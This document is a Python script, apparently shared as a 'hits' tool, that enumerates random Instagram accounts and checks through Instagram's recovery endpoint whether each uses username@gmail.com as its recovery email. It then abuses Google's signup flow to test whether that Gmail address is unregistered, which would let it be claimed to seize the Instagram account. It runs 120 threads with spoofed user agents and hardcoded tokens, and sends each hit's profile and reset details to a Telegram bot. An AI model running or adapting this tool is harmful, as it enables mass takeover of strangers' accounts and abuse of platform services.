import os
import time
import json
import uuid
import random
import hashlib
import re
import threading
import sys
import string
from datetime import datetime
from random import choice, randrange
import requests
from requests import post as pp
from user_agent import generate_user_agent
from cfonts import render
from colorama import Fore, Style, init

init(autoreset=True)

total_hits = hits = bad_insta = bad_email = good_ig = 0
infoinsta = {}
session = requests.Session()

API_CONFIG = {
    "instagram_recovery_url": "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
    "ig_sig_key_version": "ig_sig_key_version",
    "signed_body": "signed_body",
    "cookie_value": "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
    "content_type_header": "Content-Type",
    "cookie_header": "Cookie",
    "user_agent_header": "User-Agent",
    "default_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "google_accounts_url": "https://accounts.google.com",
    "google_accounts_domain": "accounts.google.com",
    "referrer_header": "referer",
    "origin_header": "origin",
    "authority_header": "authority",
    "content_type_form": "application/x-www-form-urlencoded; charset=UTF-8",
    "content_type_form_alt": "application/x-www-form-urlencoded;charset=UTF-8",
    "token_file": "wasu_token.txt",
    "wasu_domain": "@gmail.com"
}


COLORS = {
    'BLUE': '\033[94m', 'RESET': '\033[0m', 'BOLD': '\033[1m', 'YELLOW': '\033[93m',
    'RED': '\033[91m', 'GREEN': '\033[92m', 'CYAN': '\033[96m', 'MAGENTA': '\033[95m',
    'E': '\033[1;31m', 'M': '\x1b[1;37m', 'HH': '\033[1;34m', 'R': '\033[1;31;40m',
    'F': '\033[1;32;40m', 'C': "\033[1;97;40m", 'B': '\033[1;36;40m', 'G': '\033[1;34m'
}

def rand_color():
    return f'\x1b[38;5;{random.randint(16, 231)}m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    clear_screen()
    COLOR_COMBOS = [['green','yellow'], ['magenta','red'], ['blue','cyan'], 
                   ['white','gray'], ['red','magenta'], ['yellow','green']]
    wasu_colors, qe_colors = random.sample(COLOR_COMBOS, 2)
    WASU = render('PIRATE X AYUSH', colors=wasu_colors, align='center', font='block', background='black')
    print(WASU)
    print(f"{rand_color()} 𝐃𝐄𝐕 :- @BEASTEREN                  ")
    print(f"")

def get_user_inputs():
    ID = input("𝐓𝐠 𝐔𝐬𝐞𝐫 𝐈'𝐝 : ")
    TOKEN = input("𝐓𝐠 𝐁𝐨𝐭 𝐓𝐨𝐤𝐞𝐧 : ")
    
    print(f"For Quality Hits 20 minnimum followers and 1 post")
    print(f"For Fastest Random 10 minnimum followers and 0 post")
    print('\n𝐒𝐞𝐥𝐞𝐜𝐭 𝐀 𝐘𝐞𝐚𝐫 𝐅𝐨𝐫 𝐔𝐬𝐞𝐫 𝐈𝐝 𝐑𝐚𝐧𝐠𝐞:')
    ranges = {
        1: (1279001, 17750000),      
        2: (17750000, 279760000),   
        3: (279760000, 900990000),   
        4: (900990000, 1629010000),  
        5: (1629010000, 2500000000), 
        6: (2500000000, 3713668786), 
        7: (3713668786, 5699785217), 
        8: (5699785217, 8507940634), 
        9: (2500000000, 57464707083) 
    }
    
    for k in range(1, 10):
        print(f"{k} - {2010+k}")
    
    year_choice = safe_int_input('𝐄𝐧𝐭𝐞𝐫 𝐘𝐞𝐚𝐫 (1-9): ', 8)
    min_followers = safe_int_input('𝐄𝐧𝐭𝐞𝐫 𝐌𝐢𝐧𝐢𝐦𝐮𝐦 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬: ', 10)
    min_posts = safe_int_input('𝐄𝐧𝐭𝐞𝐫 𝐌𝐢𝐧𝐢𝐦𝐮𝐦 𝐏𝐨𝐬𝐭: ', 1)
    
    clear_screen()
    return ID, TOKEN, ranges.get(year_choice, ranges[5]), min_followers, min_posts

def safe_int_input(prompt, default):
    try:
        value = input(prompt).strip()
        return int(value) if value else default
    except:
        return default

def generate_user_id(range_tuple):
    start, end = range_tuple
    return str(random.randrange(start, end))

def display_stats():
    global hits, bad_insta, bad_email, good_ig
    clear_screen()
    output = (
         "⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n"  f"《𝐔𝐍𝐂》:《{hits}》\n"   f"《𝐁𝐀𝐃》:《{bad_insta}》\n"    f"《𝐅𝐀𝐋𝐒𝐄》:《{bad_email}》\n" f"《𝐆𝐎𝐎𝐃》:《{good_ig}》\n"
        "⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n"
f"𝐃𝐄𝐕 : @𝐁𝐄𝐀𝐒𝐓𝐄𝐑𝐄𝐍 𝐂𝐎𝐋𝐋𝐀𝐁 𝐖𝐈𝐓𝐇 @𝐎𝐖𝐍𝐄𝐑_𝐇𝐔_𝐘𝐀𝐀𝐑 \n"
"⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n"
    )
    print(output)

def update_stats():
    display_stats()

def generate_token():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            API_CONFIG["user_agent_header"]: str(generate_user_agent())
        }
        
        recovery_url = f"{API_CONFIG['google_accounts_url']}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
        res1 = requests.get(recovery_url, headers=headers)
        match = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        )
        
        if match:
            tok = match.group(2)
        else:
            raise Exception("Token not found")
            
        cookies = {'__Host-GAPS': host}
        headers2 = {
            API_CONFIG["authority_header"]: API_CONFIG["google_accounts_domain"],
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            API_CONFIG["origin_header"]: API_CONFIG["google_accounts_url"],
            API_CONFIG["referrer_header"]: 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            API_CONFIG["user_agent_header"]: generate_user_agent()
        }
        
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
        }
        
        response = requests.post(
            f"{API_CONFIG['google_accounts_url']}/_/signup/validatepersonaldetails",
            cookies=cookies, headers=headers2, data=data
        )
        
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict().get('__Host-GAPS', host)
        
        with open(API_CONFIG["token_file"], 'w') as f:
            f.write(f"{token_line}//{host}\n")
            
    except Exception as e:
        print("Error in token generation:", e)
        generate_token()

def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
            
        with open(API_CONFIG["token_file"], 'r') as f:
            token_data = f.read().splitlines()[0]
            
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        
        headers = {
            API_CONFIG["authority_header"]: API_CONFIG["google_accounts_domain"],
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            API_CONFIG["origin_header"]: API_CONFIG["google_accounts_url"],
            API_CONFIG["referrer_header"]: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            API_CONFIG["user_agent_header"]: generate_user_agent()
        }
        
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
                
        response = pp(
            f"{API_CONFIG['google_accounts_url']}/_/signup/usernameavailability",
            params=params, cookies=cookies, headers=headers, data=data
        )
        
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            full_email = email + API_CONFIG["wasu_domain"]
            return True, full_email
        else:
            bad_email += 1
            update_stats()
            return False, None
            
    except Exception as e:
        print("Gmail check error:", e)
        return False, None

def check_instagram(email):
    global good_ig, bad_insta
    
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    
    headers = {
        API_CONFIG["user_agent_header"]: ua,
        API_CONFIG["cookie_header"]: API_CONFIG["cookie_value"],
        API_CONFIG["content_type_header"]: API_CONFIG["content_type_form"]
    }
    
    data = {
        API_CONFIG["signed_body"]: (
            '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
            json.dumps({
                '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'adid': uui,
                'guid': uui,
                'device_id': device_id,
                'query': email
            })
        ),
        API_CONFIG["ig_sig_key_version"]: '4'
    }
    
    response = session.post(API_CONFIG["instagram_recovery_url"], headers=headers, data=data).text
    
    if email in response:
        good_ig += 1
        update_stats()
        return True
    else:
        bad_insta += 1
        update_stats()
        return False

def get_reset_email(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            API_CONFIG["user_agent_header"]: 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
            API_CONFIG["cookie_header"]: API_CONFIG["cookie_value"],
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form"],
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        
        data = {
            API_CONFIG["signed_body"]: (
                '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                '"device_id":"android-b93ddb37e983481c",'
                '"query":"' + user + '"}'
            ),
            API_CONFIG["ig_sig_key_version"]: '4'
        }
        
        response = session.post(API_CONFIG["instagram_recovery_url"], headers=headers, data=data).json()
        return response.get('email', 'No reset email found')
        
    except Exception as e:
        print("Reset email error:", e)
        return 'Error fetching reset email'

def get_registration_year(user_id):
    try:
        uid = int(user_id)
        if 1 < uid <= 1278889:
            return 2010
        elif 1279000 <= uid <= 17750000:
            return 2011
        elif 17750001 <= uid <= 279760000:
            return 2012
        elif 279760001 <= uid <= 900990000:
            return 2013
        elif 900990001 <= uid <= 1629010000:
            return 2014
        elif 1629010001 <= uid <= 2369359761:
            return 2015
        elif 2369359762 <= uid <= 4239516754:
            return 2016
        elif 4239516755 <= uid <= 6345108209:
            return 2017
        elif 6345108210 <= uid <= 10016232395:
            return 2018
        elif 10016232396 <= uid <= 27238602159:
            return 2019
        elif 27238602160 <= uid <= 43464475395:
            return 2020
        elif 43464475396 <= uid <= 50289297647:
            return 2021
        elif 50289297648 <= uid <= 57464707082:
            return 2022
        elif 57464707083 <= uid <= 63313426938:
            return 2023
        else:
            return "2024 or 2025"
    except:
        return "Unknown"

def InfoAcc(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    
    user_id = account_info.get('pk', 0)
    full_name = account_info.get('full_name', '')
    followers = account_info.get('follower_count', 0)
    following = account_info.get('following_count', '')
    posts = account_info.get('media_count', '')
    bio = account_info.get('biography', '')
    is_private = account_info.get('is_private', False)
    is_verified = account_info.get('is_verified', False)
    is_business = account_info.get('is_business', False)
    
    reg_date = get_registration_year(user_id)
    
    try:
        if followers >= 20:
            meta = True
        else:
            meta = False
    except:
        meta = False

    business_meta = False
    if account_info.get('is_business'):
        business_meta = True
    elif account_info.get('is_professional_account'):
        business_meta = True
    elif account_info.get('category_name'):
        business_meta = True
    elif account_info.get('public_email') or account_info.get('phone_number'):
        business_meta = True

    total_hits += 1
    reset_email = get_reset_email(username)
    
    info_text = f"""
    𝗣𝗜𝗥𝗔𝗧𝗘 𝗦𝗘𝗡𝗗 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗛𝗜𝗧
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
𝗗𝗘𝗩 @BEASTEREN
𝐓𝐑𝐔𝐄 : {total_hits}
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
🫅🏻️ 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : @{username}
⚡ 𝐍𝐀𝐌𝐄 : {full_name}
📧 𝐄𝐌𝐀𝐈𝐋 : {username}@{domain}
📈️ 𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒 : {followers}
📉️ 𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆 : {following}
🖼️️ 𝐏𝐎𝐒𝐓𝐒 : {posts}
🪪️ 𝐀𝐂𝐂 𝐈𝐃 : {user_id}
🗓️ 𝐘𝐄𝐀𝐑 : {reg_date}
📜 𝐁𝐈𝐎 : {bio}
🔒 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 : {is_private}
⚜️ 𝐕𝐄𝐑𝐈𝐅𝐈𝐄𝐃 : {is_verified}
♻️ 𝐑𝐄𝐒𝐄𝐓 : {reset_email}
🔗 𝐋𝐈𝐍𝐊 : https://www.instagram.com/{username}
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
𝐌𝐄𝐓𝐀 : {meta}
𝐁𝐔𝐒𝐈𝐍𝐄𝐒𝐒 𝐌𝐄𝐓𝐀 : {business_meta}
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘"""
    
    with open('wasu_results.txt', 'a', encoding='utf-8') as f:
        f.write(info_text + "\n\n")
    
    return info_text

def scrape_instagram_data(range_tuple, min_followers, min_posts, TOKEN, ID):
    while True:
        try:
            user_id = generate_user_id(range_tuple)
            model_number = str(random.randint(150, 999))
            android_version = random.choice(['23/6.0', '24/7.0', '25/7.1.1', '26/8.0', '27/8.1', '28/9.0'])
            dpi = str(random.randint(100, 1300))
            resolution = f"{random.randint(200, 2000)}x{random.randint(200, 2000)}"
            brand = random.choice(['SAMSUNG', 'HUAWEI', 'LGE/lge', 'HTC', 'ASUS', 'ZTE', 'ONEPLUS', 'XIAOMI', 'OPPO', 'VIVO', 'SONY', 'REALME'])
            build_suffix = str(random.randint(111, 999))
            
            user_agent = f"Instagram 311.0.0.32.118 Android ({android_version}; {dpi}dpi; {resolution}; {brand}; SM-T{model_number}; SM-T{model_number}; qcom; en_US; 545986{build_suffix})"
            lsd_token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            
            headers = {
                'accept': '*/*',
                'accept-language': 'en,en-US;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1',
                'origin': 'https://www.instagram.com',
                'priority': 'u=1, i',
                'referer': 'https://www.instagram.com/cristiano/following/',
                'user-agent': user_agent,
                'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                'x-fb-lsd': lsd_token,
            }
            
            data = {
                'lsd': lsd_token,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                'variables': json.dumps({'userID': user_id, 'username': 'cristiano'}),
                'server_timestamps': 'true',
                'doc_id': '7717269488336001',
            }
            
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            user_info = response.json().get('data', {}).get('user', {})
            username = user_info.get('username', '')
            
            if username and '_' not in username:
                infoinsta[username] = user_info
                follower_count = int(user_info.get('follower_count', 0))
                media_count = int(user_info.get('media_count', 0))
                
                if follower_count >= min_followers and media_count >= min_posts:
                    email = f"{username}{API_CONFIG['wasu_domain']}"
                    
                    #WASUpy novapython
                    is_valid_instagram = check_instagram(email)
                    
                    if is_valid_instagram:
                        #WASUpy novapython
                        is_valid_gmail, full_email = check_gmail(username)
                        
                        if is_valid_gmail:
                            #WASUpy novapython
                            info_text = InfoAcc(username, API_CONFIG['wasu_domain'].replace('@', ''))
                            try:
                                inline_keyboard = [[
                                    {'text': 'Developer', 'url': 'https://t.me/WASUpy'},
                                    {'text': 'Join Channel', 'url': 'https://t.me/novaredirect'}
                                ]]
                                payload = {
                                    'chat_id': ID,
                                    'text': info_text,
                                    'reply_markup': json.dumps({'inline_keyboard': inline_keyboard})
                                }
                                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data=payload)
                            except Exception as e:
                                print("Telegram message error:", e)
                    
        except Exception as e:
            pass

def stats_loop():
    while True:
        update_stats()
        time.sleep(2)

def main():
    display_banner()
    
   
    ID, TOKEN, selected_range, min_followers, min_posts = get_user_inputs()
    
   
    print("wait a moment...")
    generate_token()
   
   
    stats_thread = threading.Thread(target=stats_loop, daemon=True)
    stats_thread.start()
    
 
    print(f"Starting scraping with: Followers ≥ {min_followers}, Posts ≥ {min_posts}, Year range: {selected_range}")
    print("Tool is now running...")
    threads = []
    for _ in range(120):
        thread = threading.Thread(target=scrape_instagram_data, args=(selected_range, min_followers, min_posts, TOKEN, ID), daemon=True)
        thread.start()
        threads.append(thread)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nTool stopped by user.")

if __name__ == "__main__":
    main()
    
    #this tool by @wasupy give credit 
